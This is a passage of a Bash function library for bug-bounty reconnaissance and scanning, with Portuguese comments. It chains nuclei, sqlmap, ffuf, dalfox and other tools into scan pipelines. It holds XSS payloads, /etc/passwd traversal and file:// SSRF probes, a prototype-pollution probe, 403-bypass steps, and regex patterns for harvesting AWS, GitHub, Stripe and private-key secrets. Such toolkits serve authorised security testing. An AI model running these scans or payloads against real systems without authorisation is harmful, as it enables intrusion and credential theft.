  [ -s "nucPanel" ] && notify -silent -bulk -data nucPanel -id nuclei
}

rceNuc() {
  echo "${yellow}[+] RCE scan${reset}"
  [ -s "ALLHTTP" ] && cat ALLHTTP | nuclei -tags rce -H "$UserAgent" -o rcevector
  [ -s "rcevector" ] && echo "RCE found!" | notify -silent -id nuclei
  [ -s "rcevector" ] && notify -silent -bulk -data rcevector -id nuclei
}

exposureNuc() {
  echo "${yellow}[+] Exposure scan${reset}"
  [ -s "ALLHTTP" ] && cat ALLHTTP | nuclei -tags exposure -H "$UserAgent" -o exposurevector
  [ -s "exposurevector" ] && echo "Exposure found" | notify -silent -id nuclei
  [ -s "exposurevector" ] && notify -silent -bulk -data exposurevector -id nuclei
}

lfiScan() {
  echo "${yellow}[+] LFI scan${reset}"
  cat ALLHTTP | nuclei -tags lfi -H "$UserAgent" -o lfivector
  [ -s "lfivector" ] && echo "LFI found!" | notify -silent -id nuclei
  [ -s "lfivector" ] && notify -silent -bulk -data lfivector -id nuclei
}

ssrfdetect() {
  echo "${yellow}[+] SSRF Detect${reset}"
  cat ALLHTTP | nuclei -tags ssrf -H "$UserAgent" -o ssrfdetect
  [ -s "ssrfdetect" ] && echo "SSRF found!" | notify -silent -id nuclei
  [ -s "ssrfdetect" ] && notify -silent -bulk -data ssrfdetect -id nuclei
}

GitScan() {
  echo "${yellow}[+] Git scan${reset}"
  cat ALLHTTP | nuclei -tags git -H "$UserAgent" -o gitvector
  [ -s "gitvector" ] && echo "Git exposure found!" | notify -silent -id nuclei
  [ -s "gitvector" ] && notify -silent -bulk -data gitvector -id nuclei
}

jiraScan() {
  echo "${yellow}[+] Jira scan${reset}"
  cat ALLHTTP | nuclei -t "$HOME/custom_nuclei_templates/ssrf-jira-well.yaml" -H "$UserAgent" -o jiraNuclei
  [ -s "jiraNuclei" ] && echo "Jira vector found!" | notify -silent -id nuclei
  [ -s "jiraNuclei" ] && notify -silent -bulk -data jiraNuclei -id nuclei
}

graphqldetect() {
  echo "${yellow}[+] GraphQL detect${reset}"
  cat ALLHTTP | nuclei -id graphql-detect -H "$UserAgent" -o graphqldetect
  cat ALLHTTP | nuclei -tags graphql -H "$UserAgent" -o graphqlvectors 2>/dev/null
  [ -s "graphqldetect" ] && echo "GraphQL found!" | notify -silent -id api
  [ -s "graphqldetect" ] && notify -silent -bulk -data graphqldetect -id api
}

swaggerUIdetect() {
  echo "${yellow}[+] Swagger detect${reset}"
  [ -s "ALLHTTP" ] && cat ALLHTTP | nuclei -tags swagger -H "$UserAgent" -o swaggerUI
  [ -s "ALLHTTP" ] && cat ALLHTTP | nuclei -t "$HOME/custom_nuclei_templates/api-recon-workflow.yaml" \
    -H "$UserAgent" -o swaggerCustom 2>/dev/null
  [ -s "swaggerUI" ] && echo "Swagger found!" | notify -silent -id api
  [ -s "swaggerUI" ] && notify -silent -bulk -data swaggerUI -id api
}

APIRecon() {
  echo "${yellow}[+] API endpoint recon${reset}"
  [ -s "ALLHTTP" ] && cat ALLHTTP | nuclei \
    -w "$HOME/custom_nuclei_templates/api-recon-workflow.yaml" \
    -H "$UserAgent" -o nucleiapirecon
  [ -s "ALLHTTP" ] && for host in $(cat ALLHTTP | head -100); do
    ffuf -u "$host/FUZZ" -w "$HOME/Lists/httparchive_apiroutes.txt" \
      -mc 200,201,204,301,302,401,403 -t 50 -s -o ".tmp/api_${host//\//_}.json" \
      -of json 2>/dev/null
  done
  [ -s "nucleiapirecon" ] && echo "API found!" | notify -silent -id api
  [ -s "nucleiapirecon" ] && notify -silent -bulk -data nucleiapirecon -id api
}

cveScan() {
  echo "${yellow}[+] CVE scan via cvemap + nuclei${reset}"
  cat ALLHTTP | nuclei -severity high,critical -H "$UserAgent" \
    -eid expired-ssl,mismatched-ssl,deprecated-tls,weak-cipher-suites,self-signed-ssl \
    -o cveResults
  [ -s "cveResults" ] && echo "CVE found!" | notify -silent -id nuclei
  [ -s "cveResults" ] && notify -silent -bulk -data cveResults -id nuclei
}

nucauto() {
  [ -s "cleanHakipResult.txt" ] && cat cleanHakipResult.txt | $HTTPX_BIN -sc 2>/dev/null | grep -oP '^https?://\S+' | anew ALLHTTP
  cat ALLHTTP | nuclei -H "$UserAgent" \
    -eid expired-ssl,mismatched-ssl,deprecated-tls,weak-cipher-suites,self-signed-ssl \
    -severity critical,high,medium,low -o resultNuclei
  [ -s "resultNuclei" ] && notify -silent -bulk -data resultNuclei -id nuclei
}

massALLHTTPtemplate() {
  find /root/Projects -type f -name ALLHTTP | xargs -I{} -P2 bash -c 'cat {}' | anew allhttpalive
  cat allhttpalive | nuclei -t "$1" -o massALLTEST.txt
  [ -s "massALLTEST.txt" ] && cat massALLTEST.txt | notify -silent
}

nucTakeover() {
  echo "${yellow}[+] Takeover scan${reset}"
  cat ALLHTTP | nuclei -tags takeover -H "$UserAgent" -o nucleiTakeover
  [ -s "nucleiTakeover" ] && echo "Takeover found!" | notify -silent -id nuclei
  [ -s "nucleiTakeover" ] && notify -silent -bulk -data nucleiTakeover -id nuclei
  cat ALLHTTP | nuclei -t "$HOME/custom_nuclei_templates/m4cddr-takeovers.yaml" \
    -H "$UserAgent" -o takeovers_m4c
  [ -s "takeovers_m4c" ] && echo "Takeover (m4c) found!" | notify -silent -id nuclei
  [ -s "takeovers_m4c" ] && notify -silent -bulk -data takeovers_m4c -id nuclei
}

# ─── XSS ──────────────────────────────────────────────────────────────────────

XssScan() {
  echo "${yellow}[+] XSS scan${reset}"
  cat ALLHTTP | nuclei -tags xss -es info -H "$UserAgent" -o xssnuclei
  [ -s "xssnuclei" ] && echo "XSS found!" | notify -silent -id xss
  [ -s "xssnuclei" ] && notify -silent -bulk -data xssnuclei -id xss
}

xsshunter() {
  echo "INIT XSS HUNTER" | notify -silent -id xss
  for domain in $(cat domains); do
    waymore -i "$domain" -mode U -oU ".tmp/waymore_${domain}.txt" 2>/dev/null
    cat ".tmp/waymore_${domain}.txt" | awk '{print tolower($0)}' | anew urldump.txt
  done
  [ -s "urldump.txt" ] && cat urldump.txt | uro | kxss | awk '{print $0}' | anew xssvector
  [ -s "urldump.txt" ] && cat urldump.txt | uro | gf xss | $HTTPX_BIN -sc 2>/dev/null | grep -oP '^https?://\S+' | anew xssvector
  [ -s "xssvector" ] && dalfox file xssvector --skip-bav -b "$BXSS_CALLBACK" -o XSSresult 2>/dev/null
  [ -s "XSSresult" ] && cat XSSresult | notify -silent -id xss
  [ -s "xssvector" ] && cat xssvector | qsreplace '"><svg onload=confirm(1)>' | \
    airixss -payload "confirm(1)" | grep -v 'Not' | anew airixss.txt
  [ -s "airixss.txt" ] && notify -silent -bulk -data airixss.txt -id xss
  [ -s "xssvector" ] && cat xssvector | qsreplace '"><img src=x onerror=alert(1);>' | \
    freq | grep -v 'Not' | anew FreqXSS.txt
  [ -s "FreqXSS.txt" ] && notify -silent -bulk -data FreqXSS.txt -id xss
}

xssknox() {
  [ -s "waybackdata" ] && cat waybackdata | uro | kxss | awk '{print $9}' | anew kxssresult
  [ -s "kxssresult" ] && python3 "$HOME/Tools/knoxnl/knoxnl.py" -i kxssresult -s -o xssSuccess
  [ -s "xssSuccess" ] && echo "XSS via KNOXSS!" | notify -silent -id xss
  [ -s "xssSuccess" ] && notify -silent -bulk -data xssSuccess -id xss
}

OpenRedirectScan() {
  echo "${yellow}[+] OpenRedirect scan${reset}"
  cat ALLHTTP | nuclei -tags redirect -es info -H "$UserAgent" -o openredirectVector
  [ -s "openredirectVector" ] && echo "OpenRedirect found!" | notify -silent -id nuclei
  [ -s "openredirectVector" ] && cat openredirectVector | notify -silent -id nuclei
}

# ─── SQLI ─────────────────────────────────────────────────────────────────────

sqliScan() {
  echo "${yellow}[+] SQLi scan${reset}"
  cat ALLHTTP | nuclei -tags sqli -H "$UserAgent" -o sqlivector
  [ -s "sqlivector" ] && echo "SQLi found!" | notify -silent -id nuclei
  [ -s "sqlivector" ] && notify -silent -bulk -data sqlivector -id nuclei
}

# ─── [NEW] SQLI AVANÇADO com SQLmap ──────────────────────────────────────────

sqliAdvanced() {
  echo "${yellow}[+] SQLi Avançado — SQLmap nos parâmetros coletados${reset}"
  mkdir -p sqli_results

  # Coleta URLs com parâmetros
  [ -s "crawlerResults.txt" ] && cat crawlerResults.txt | gf sqli | uro | anew sqli_results/sqli_urls.txt
  [ -s "params" ] && cat params | grep "=" | uro | anew sqli_results/sqli_urls.txt

  # SQLmap em modo gentil (rate-limit respeitoso para bug bounty)
  if [ -s "sqli_results/sqli_urls.txt" ] && command -v sqlmap &>/dev/null; then
    sqlmap -m sqli_results/sqli_urls.txt \
      --batch \
      --random-agent \
      --level 3 \
      --risk 2 \
      --threads 5 \
      --forms \
      --crawl=2 \
      --output-dir=sqli_results/sqlmap_output \
      2>/dev/null
    echo "${green}[+] SQLmap concluído. Resultados em sqli_results/sqlmap_output/${reset}"
  fi
}

# ─── SSTI ─────────────────────────────────────────────────────────────────────

sstiScan() {
  echo "${yellow}[+] SSTI scan${reset}"
  cat ALLHTTP | nuclei -tags ssti -H "$UserAgent" -o sstivector
  [ -s "sstivector" ] && echo "SSTI found!" | notify -silent -id nuclei
  [ -s "sstivector" ] && notify -silent -bulk -data sstivector -id nuclei
}

# ─── PARAMS ───────────────────────────────────────────────────────────────────

paramspider() {
  echo "${yellow}[+] ParamSpider${reset}"
  for url in $(cat ALLHTTP); do
    python3 "$HOME/Tools/ParamSpider/paramspider.py" -d "$url" \
      --exclude jpg,png,gif,woff,css,js,svg,woff2,ttf,eot,json 2>/dev/null
  done
  cat output/http:/*.txt 2>/dev/null | anew params
  cat output/https:/*.txt 2>/dev/null | anew params
}

arjunScan() {
  echo "${yellow}[+] Arjun param discovery${reset}"
  cat ALLHTTP | xargs -P 10 -I% arjun -u % --stable -q -oT arjun_params.txt 2>/dev/null
  [ -s "arjun_params.txt" ] && cat arjun_params.txt | notify -silent -id nuclei
}

# ─── 403 BYPASS ───────────────────────────────────────────────────────────────

bypass4xx() {
  echo "${yellow}[+] 403 bypass${reset}"
  [ -s "403HTTP" ] && cat 403HTTP | dirdar -only-ok | anew dirdarResult.txt
  [ -s "dirdarResult.txt" ] && cat dirdarResult.txt | sed -e '1,12d' | sed '/^$/d' | \
    anew 4xxbypass.txt | notify -silent -id subs
  [ -s "403HTTP" ] && for url in $(cat 403HTTP); do
    python3 "$HOME/Tools/nomore403/nomore403.py" -u "$url" 2>/dev/null | \
      grep "200" | anew 4xxbypass_nm.txt
  done
}

# ─── CORS ─────────────────────────────────────────────────────────────────────

Corstest() {
  echo "${yellow}[+] CORS test${reset}"
  gf cors roots | awk -F '/' '{print $2}' | anew | $HTTPX_BIN -sc 2>/dev/null | grep -oP '^https?://\S+' > CORSHTTP
  [ -s "CORSHTTP" ] && python3 "$HOME/Tools/CORStest/corstest.py" CORSHTTP -q | notify -silent
  [ -s "ALLHTTP" ] && python3 "$HOME/Tools/CORScanner/cors_scan.py" \
    -u "$(cat ALLHTTP | tr '\n' ',')" -o corsscan_result.txt 2>/dev/null
}

# ─── CLOUD ────────────────────────────────────────────────────────────────────

cloudEnum() {
  echo "${yellow}[+] Cloud asset enumeration${reset}"
  Domain=$(cat domains)
  python3 "$HOME/Tools/S3Scanner/s3scanner.py" --bucket "$Domain" 2>/dev/null | anew s3buckets.txt
  python3 "$HOME/Tools/cloud_enum/cloud_enum.py" -k "$Domain" \
    --disable-azure --disable-gcp 2>/dev/null | anew cloud_assets.txt
  [ -s "cloud_assets.txt" ] && echo "Cloud assets found!" | notify -silent -id nuclei
  cat ALLHTTP | nuclei -tags aws,cloud,s3 -H "$UserAgent" -o cloudnuclei 2>/dev/null
  [ -s "cloudnuclei" ] && notify -silent -bulk -data cloudnuclei -id nuclei
}

# ─── TAKEOVER ─────────────────────────────────────────────────────────────────

subtakeover() {
  echo "${yellow}[+] Subdomain takeover${reset}"
  SubOver -l clean.subdomains -v 2>/dev/null | anew subtakeover_result.txt
  [ -s "subtakeover_result.txt" ] && cat subtakeover_result.txt | notify -silent -id subs
}

# ─── SMUGGLING ────────────────────────────────────────────────────────────────

smuggling() {
  cat ALLHTTP | rush -j 3 "python3 $ToolsPath/smuggler/smuggler.py -u {}" | \
    tee -a smuggler_op.txt
}

# ─── SCANNING COMBOS ──────────────────────────────────────────────────────────

scanPortsAndNuclei() {
  echo "${yellow}[+] Recon: mapcidr + naabu + nuclei${reset}"
  mapcidr -l dnsx.txt -silent -aggregate -o mapcidr.txt
  naabu -l mapcidr.txt -top-ports 1000 -silent -sa | \
    $HTTPX_BIN -sc -timeout 60 -threads 100 2>/dev/null | grep -oP '^https?://\S+' > naabuIP.txt
  cat naabuIP.txt | nuclei -silent -o nuclei.txt -severity low,medium,high,critical
  [ -s "nuclei.txt" ] && notify -silent -bulk -data nuclei.txt -id nuclei
}

massHakip2host() {
  echo "${yellow}[+] Mass hakip2host${reset}"
  Domain=$(cat domains)
  rush -i mapcidr.txt "prips {} | hakip2host | anew hakip2hostResult.txt"
  [ -s "hakip2hostResult.txt" ] && cat hakip2hostResult.txt | grep "$Domain" | \
    awk '{print $3}' | anew cleanHakipResult.txt
}

faviconEnum() {
  echo "${yellow}[+] FavFreak favicon enum${reset}"
  cat 200HTTP | python3 "$HOME/Tools/FavFreak/favfreak.py" --shodan -o outputFavFreak
}

screenshot() {
  echo "${yellow}[+] Screenshots com gowitness v3${reset}"
  gowitness scan file -f ALLHTTP --screenshot-path ./screenshots --write-db 2>/dev/null
}

# ─── DATA GATHERING ───────────────────────────────────────────────────────────

getdata() {
  echo "${yellow}[+] Save all HTTP responses${reset}"
  cat ALLHTTP | fff -d 50 -S -o AllHttpData
}

# nginx path traversal
nginxpath() {
  echo "${yellow}[+] Nginx path traversal${reset}"
  ffuf -c -w ALLHTTP -u FUZZ////////../../../../../etc/passwd \
    -mr "root:x" -or -o nginxpath.txt
  [ -s "nginxpath.txt" ] && echo "Nginx traversal found!" | notify -silent
  [ -s "nginxpath.txt" ] && notify -silent -bulk -data nginxpath.txt -id nuclei
}

geojson() {
  echo "${yellow}[+] GeoJSON SSRF${reset}"
  ffuf -c -w ALLHTTP -u FUZZ/api/geojson?url=file:///etc/passwd \
    -mr "root:x" -or -o geojson.txt
  [ -s "geojson.txt" ] && echo "geojson SSRF found!" | notify -silent
  [ -s "geojson.txt" ] && cat geojson.txt | notify -silent
}

textinjection() {
  echo "${yellow}[+] Text injection${reset}"
  ffuf -c -w ALLHTTP -u FUZZ///example.com -mr 'Cannot GET' -or -o textinjection.txt
  [ -s "textinjection.txt" ] && echo "Text injection found!" | notify -silent
  [ -s "textinjection.txt" ] && cat textinjection.txt | notify -silent
}

prototypefuzz() {
  echo "${yellow}[+] Prototype pollution fuzz${reset}"
  cat ALLHTTP | sed 's/$/\/?__proto__[testparam]=exploit\//' | \
    page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | \
    sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | grep -v "NOT" | notify -silent
}

# ─── FUZZING HELPERS ──────────────────────────────────────────────────────────

fufapi() {
  ffuf -u "$1/FUZZ" -w "$HOME/Lists/httparchive_apiroutes.txt" \
    -mc 200,201,204,301,302,401,403 -t 100 -v
}

fufdir() {
  ffuf -u "$1/FUZZ" -w "$DIRS_LARGE" -mc 200,301,302,403 -t 170
}

fufextension() {
  ffuf -u "$1/FUZZ" -mc 200,301,302,403,401 -t 150 \
    -w "$ToolsPath/ffuf_extension.txt" \
    -e .php,.asp,.aspx,.jsp,.py,.txt,.conf,.config,.bak,.backup,.swp,.old,.db,.sql,.json,.xml,.log,.zip,.tar.gz,.env
}

feroxdir() {
  feroxbuster -u "$1" -e \
    --status-codes 200,204,301,307,401,405,400,302 \
    -k -w "$HOME/Lists/raft-large-directories.txt"
}

vhostEnum() {
  ffuf -w "$HOME/Lists/namelist.txt" \
    -u "http://$1" -H "HOST: FUZZ.$1" -fs 100 -t 100
}

# ─── SECRETS ──────────────────────────────────────────────────────────────────

secrets() {
  echo "[ + ] Checking for basic auth..."
  grep -HnriEo 'basic [a-zA-Z0-9=:+/-]{5,100}'

  echo "[ + ] Google Cloud / Maps API..."
  grep -HnriEo 'AIza[0-9A-Za-z\-]{35}'

  echo "[ + ] Slack webhooks..."
  grep -HnriEo 'https://hooks.slack.com/services/T[a-zA-Z0-9]{8}/B[a-zA-Z0-9]{8}/[a-zA-Z0-9]{24}'

  echo "[ + ] AWS Access Key..."
  grep -HnriEo 'AKIA[0-9A-Z]{16}'

  echo "[ + ] AWS Secret..."
  grep -HnriEo '(?i)aws(.{0,20})?(?-i)['\''"'\''][0-9a-zA-Z/+]{40}['\''"'\'']'

  echo "[ + ] Bearer auth..."
  grep -HnriEo 'bearer [a-zA-Z0-9\-\.=]+'

  echo "[ + ] Cloudinary auth..."
  grep -HnriEo 'cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+'

  echo "[ + ] Mailgun API key..."
  grep -HnriEo 'key-[0-9a-zA-Z]{32}'

  echo "[ + ] GitHub tokens..."
  grep -HnriEo 'gh[oprsu]_[A-Za-z0-9]{36}'
  grep -HnriEo 'github_pat_[A-Za-z0-9]{82}'

  echo "[ + ] Stripe keys..."
  grep -HnriEo '(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}'

  echo "[ + ] Twilio..."
  grep -HnriEo 'SK[0-9a-fA-F]{32}'

  echo "[ + ] SendGrid..."
  grep -HnriEo 'SG\.[a-zA-Z0-9\-_\.]{22}\.[a-zA-Z0-9\-_\.]{43}'

  echo "[ + ] Private keys..."
  grep -HnriEo '-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----'

  echo "[ + ] API key params..."
  grep -HnriEo "(api_key|api-key|apikey|API_KEY)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

  echo "[ + ] Access tokens..."
  grep -HnriEo "(access_key|access_token|ACCESSTOKEN)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

  echo "[ + ] DB credentials..."
  grep -HnriEo "(db_password|DB_PASSWORD|db_username|DB_USERNAME)(:|=| : | = )( |\"|')[0-9A-Za-z\-]{5,100}"

  echo "[ + ] AWS S3 links..."
  grep -HnriEo "(.{8}[A-z0-9-].amazonaws.com/)[A-z0-9-].{6}"
  grep -HnriEo "(.{8}[A-z0-9-].s3.amazonaws.com/)[A-z0-9-].{6}"
}

# ─── BBRF INTEGRATION ─────────────────────────────────────────────────────────

bbrfAddDomainsAndUrls() {
  for p in $(bbrf programs); do
    bbrf scope in -p "$p" | subfinder -silent | dnsx -silent | \
      bbrf domain add - -s subfinder --show-new -p "$p" | grep -v DEBUG | notify -silent
    bbrf urls -p "$p" | $HTTPX_BIN -sc 2>/dev/null | grep -oP '^https?://\S+' | bbrf url add - -s httpx --show-new -p "$p" | \
      grep -v DEBUG | notify -silent
  done
}

bbrfresolvedomains() {
  for p in $(bbrf programs); do
    bbrf domains --view unresolved -p "$p" | \
      dnsx -silent -a -resp | tr -d '[]' | tee \
      >(awk '{print $1":"$2}' | bbrf domain update - -p "$p" -s dnsx) \
      >(awk '{print $1":"$2}' | bbrf domain add - -p "$p" -s dnsx) \
      >(awk '{print $2":"$1}' | bbrf ip add - -p "$p" -s dnsx) \
      >(awk '{print $2":"$1}' | bbrf ip update - -p "$p" -s dnsx)
  done
}

# ─── AXIOM FLEET ──────────────────────────────────────────────────────────────

fleetScan() {
  company=$(cat domains)
  liveHosts="$company-live.txt"
  axiom-fleet well -i=9
  axiom-scan 'well*' --rate=10000 -p443 --banners \
    -iL=clean.subdomains -o=masscanIC.txt
  cat masscanIC.txt | awk '{print $2}' | grep -v Masscan | grep -v Ports | sort -u | tee "$liveHosts"
  axiom-scan "well*" -iL="$liveHosts" -p443 -sV -sC -T4 -m=nmapx -o=output
  axiom-rm "well0*" -f
}

# ─── HELP ─────────────────────────────────────────────────────────────────────

bb_help() {
  echo ""
  echo "=== SUBDOMAIN RECON ==="
  echo "  subdomainenum()       - Passive sub enum (subfinder, amass, crt.sh, chaos, uncover)"
  echo "  wellSubRecon()        - Full recon: subs + ASN + brute"
  echo "  brutesub()            - Brute force subdomains (top1M + all.txt)"
  echo "  subPermutation()      - Permutation with alterx + shuffledns"
  echo "  tlsEnum()             - TLS fingerprint + SAN extraction"
  echo ""
  echo "=== PORT/HTTP ==="
  echo "  naabuRecon()          - Port scan (common ports)"
  echo "  naabuFullPorts()      - Full port scan"
  echo "  getalive()            - httpx probe + classify (200/403/etc)"
  echo ""
  echo "=== CRAWL/URLS ==="
  echo "  crawler()             - gospider+gau+wayback+katana+waymore"
  echo "  getjsurls()           - Extract JS files"
  echo "  JScrawler()           - JS-focused katana crawl"
  echo ""
  echo "=== [NEW] RECON AVANÇADO ==="
  echo "  osintRecon()          - OSINT: emails, shodan, wayback, ASN, IP history"
  echo "  googleDork()          - Google/GitHub dorks: arquivos expostos, credenciais"
  echo "  techFingerprint()     - Tech stack detalhado: webanalyze + nuclei fingerprint"
  echo "  dirDiscovery()        - Dir/file discovery: ffuf paralelo + feroxbuster recursivo"
  echo "  backupFileScan()      - Backup/sensitive files: ffuf + nuclei"
  echo ""
  echo "=== [NEW] CODE REVIEW ==="
  echo "  codeReview()          - Semgrep SAST + TruffleHog + Gitleaks + JS sinks"
  echo ""
  echo "=== VULN SCANS ==="
  echo "  lfiScan()             - LFI"
  echo "  ssrfdetect()          - SSRF"
  echo "  sqliScan()            - SQLi (nuclei)"
  echo "  sqliAdvanced()        - SQLi avançado via SQLmap"
  echo "  sstiScan()            - SSTI"
  echo "  rceNuc()              - RCE"
  echo "  XssScan()             - XSS (nuclei)"
  echo "  xsshunter()           - Full XSS chain (waymore+dalfox+airixss+freq)"
  echo "  OpenRedirectScan()    - Open redirects"
  echo "  exposureNuc()         - Info exposure"
  echo "  GitScan()             - Git exposure"
  echo "  jiraScan()            - Jira SSRF"
  echo "  panelNuc()            - Admin panels"
  echo "  graphqldetect()       - GraphQL endpoints"
  echo "  swaggerUIdetect()     - Swagger/OpenAPI"
  echo "  APIRecon()            - API endpoints + fuzzing"
  echo "  smartCveScan()        - CVE scan inteligente por tech stack"
  echo "  nucleiQuality()       - Nuclei quality scan (anti false-positive)"
  echo "  nucTakeover()         - Subdomain takeover"
  echo "  smuggling()           - HTTP smuggling"
  echo "  Corstest()            - CORS"
  echo "  bypass4xx()           - 403 bypass"
  echo "  cloudEnum()           - Cloud/S3 assets"
  echo ""
  echo "=== SECRETS ==="
  echo "  secrets()             - Grep secrets from current dir"
  echo "  secretfinder()        - SecretFinder on JS files"
  echo "  getjsdata()           - Nuclei exposure tags on JS"
  echo ""
  echo "=== PARAMS ==="
  echo "  paramspider()         - ParamSpider"
  echo "  arjunScan()           - Arjun param discovery"
  echo ""
  echo "=== FUZZING ==="
  echo "  fufapi()              - ffuf API routes"
  echo "  fufdir()              - ffuf directories"
  echo "  fufextension()        - ffuf with extensions"
  echo "  feroxdir()            - feroxbuster"
  echo "  vhostEnum()           - Virtual host enum"
  echo ""
  echo "=== PIPELINES MASTER ==="
  echo "  wellrecon()           - Subs + ports + HTTP"
  echo "  wellosint()           - OSINT + dorks + tech fingerprint  [NEW]"
  echo "  wellcrawler()         - Crawl + JS + secrets"
  echo "  wellcodereview()      - Code review completo               [NEW]"
  echo "  welldirs()            - Dir discovery + backup scan        [NEW]"
  echo "  wellnuclei()          - Full nuclei pipeline (quality)"
  echo "  wellxss()             - Full XSS pipeline"
  echo "  wellall()             - Pipeline completo do zero ao final"
  echo ""
}

# =============================================================================
# ██╗    ██╗███████╗██╗     ██╗         ██████╗ ██████╗ ███╗   ███╗██████╗  ██████╗ ███████╗
# ██║    ██║██╔════╝██║     ██║        ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔═══██╗██╔════╝
# ██║ █╗ ██║█████╗  ██║     ██║        ██║     ██║   ██║██╔████╔██║██████╔╝██║   ██║███████╗
# ██║███╗██║██╔══╝  ██║     ██║        ██║     ██║   ██║██║╚██╔╝██║██╔══██╗██║   ██║╚════██║
# ╚███╔███╔╝███████╗███████╗███████╗   ╚██████╗╚██████╔╝██║ ╚═╝ ██║██████╔╝╚██████╔╝███████║
#  ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝    ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═════╝  ╚═════╝ ╚══════╝
# PIPELINES MASTER
# =============================================================================

_banner() {
  echo ""
  echo "${bblue}╔══════════════════════════════════════════╗${reset}"
  echo "${bblue}║${reset}  ${byellow}$1${reset}"
  echo "${bblue}╚══════════════════════════════════════════╝${reset}"
  echo ""
}

_step() {
  echo ""
  echo "${green}▶ [$2/$3] $1${reset}"
  echo "${green}─────────────────────────────────────────${reset}"
}

_done() {
  echo ""
  echo "${green}✔ $1 concluído${reset}"
  echo ""
}

# =============================================================================
# wellrecon — Recon completo de subdomínios + portas + HTTP
# =============================================================================
wellrecon() {
  _banner "WELL RECON — Subs + Ports + HTTP"
  local TOTAL=6

  _step "Enumeração passiva de subdomínios" 1 $TOTAL
  subdomainenum

  _step "TLS fingerprint + SAN discovery" 2 $TOTAL
  tlsEnum

  _step "Brute force de subdomínios" 3 $TOTAL
  brutesub

  _step "Permutação de subdomínios" 4 $TOTAL
  subPermutation

  _step "Port scan (naabu)" 5 $TOTAL
  naabuRecon

  _step "HTTP probe + classificação" 6 $TOTAL
  getalive

  _done "wellrecon"
  echo "${yellow}Arquivos gerados:${reset}"
  echo "  clean.subdomains  — subdomínios resolvidos"
  echo "  naabuScan         — hosts:portas encontrados"
  echo "  ALLHTTP           — todos os hosts HTTP ativos"
  echo "  200HTTP           — somente 200 OK"
  echo "  403HTTP           — somente 403"
  echo "  Without404        — tudo exceto 404"
}

# =============================================================================
# [NEW] wellosint — OSINT completo: dorks + emails + tech + shodan
# MITRE: TA0043 Reconnaissance
# =============================================================================
wellosint() {
  _banner "WELL OSINT — Reconnaissance Completo"
  local TOTAL=3

  _step "OSINT: emails, shodan, wayback, IP history" 1 $TOTAL
  osintRecon

  _step "Google & GitHub Dorks" 2 $TOTAL
  googleDork

  _step "Technology Fingerprinting" 3 $TOTAL
  techFingerprint

  _done "wellosint"
  echo "${yellow}Arquivos gerados:${reset}"
  echo "  osint/             — emails, shodan, wayback, ASN"
  echo "  dorks/             — dork_list.txt, dork_results.txt, github_dork_results.txt"
  echo "  techstack/         — tech_detailed.txt, unique_tech.txt"
}

# =============================================================================
# wellcrawler — Crawl completo + extração de JS + secrets
# =============================================================================
wellcrawler() {
  _banner "WELL CRAWLER — Crawl + JS + Secrets"
  local TOTAL=6

  _step "Crawl (gospider + gau + wayback + katana + waymore)" 1 $TOTAL
  crawler

  _step "Extração de arquivos JS" 2 $TOTAL
  getjsurls

  _step "Análise de JS com nuclei (tokens/exposure)" 3 $TOTAL
  getjsdata

  _step "SecretFinder nos JS files" 4 $TOTAL
  secretfinder

  _step "AWS Cognito finder" 5 $TOTAL
  awsCognitoFinder

  _step "Grep de secrets/keys no diretório" 6 $TOTAL
  secrets

  _done "wellcrawler"
  echo "${yellow}Arquivos gerados:${reset}"
  echo "  crawlerResults.txt  — todas as URLs coletadas"
  echo "  js_livelinks.txt    — JS files ativos"
  echo "  js_secrets_result   — segredos encontrados nos JS"
  echo "  JSPathNoUrl         — paths JS sem URL"
}

# =============================================================================
# [NEW] wellcodereview — Análise estática de código exposto
# MITRE: T1587.001 / T1213
# =============================================================================
wellcodereview() {
  _banner "WELL CODE REVIEW — Análise Estática"
  local TOTAL=2

  _step "Code Review: Semgrep + TruffleHog + Gitleaks + JS sinks" 1 $TOTAL
  codeReview

  _step "Backup & Sensitive File Discovery" 2 $TOTAL
  backupFileScan

  _done "wellcodereview"
  echo "${yellow}Arquivos gerados:${reset}"
  echo "  code_review/semgrep_findings.txt  — vulnerabilidades SAST"
  echo "  code_review/trufflehog_results.txt— segredos (alta precisão)"
  echo "  code_review/gitleaks_findings.txt — segredos expostos"
  echo "  code_review/js_sinks.txt          — sinks perigosos em JS"
  echo "  code_review/exposed_files.txt     — arquivos sensíveis via nuclei"
  echo "  backups/sensitive_files.txt       — arquivos de backup expostos"
}

# =============================================================================
# [NEW] welldirs — Directory & file discovery completo
# MITRE: T1083 File and Directory Discovery
# =============================================================================
welldirs() {
  _banner "WELL DIRS — Directory & File Discovery"
  local TOTAL=2

  _step "Directory discovery (ffuf paralelo + feroxbuster)" 1 $TOTAL
  dirDiscovery

  _step "403 bypass nos diretórios encontrados" 2 $TOTAL
  bypass4xx

  _done "welldirs"
  echo "${yellow}Arquivos gerados:${reset}"
  echo "  dirs/all_dirs.txt             — todos os diretórios encontrados"
  echo "  dirs/dir_nuclei_findings.txt  — exposures nos diretórios"
  echo "  4xxbypass.txt                 — 403s bypassados"
}

# =============================================================================
# wellnuclei — Todos os scans nuclei em sequência (com quality control)
# =============================================================================
wellnuclei() {
  _banner "WELL NUCLEI — Full Vulnerability Scan"
  local TOTAL=20

  _step "Quality Nuclei scan (anti false-positive)" 1 $TOTAL
  nucleiQuality

  _step "Admin Panels" 2 $TOTAL
  panelNuc

  _step "Git exposure" 3 $TOTAL
  GitScan

  _step "LFI" 4 $TOTAL
  lfiScan

  _step "SSRF" 5 $TOTAL
  ssrfdetect

  _step "RCE" 6 $TOTAL
  rceNuc

  _step "SQLi (nuclei)" 7 $TOTAL
  sqliScan

  _step "SSTI" 8 $TOTAL
  sstiScan

  _step "XSS (nuclei)" 9 $TOTAL
  XssScan

  _step "Open Redirect" 10 $TOTAL
  OpenRedirectScan

  _step "Exposure / Info Leak" 11 $TOTAL
  exposureNuc

  _step "Subdomain Takeover" 12 $TOTAL
  nucTakeover

  _step "GraphQL endpoints" 13 $TOTAL
  graphqldetect

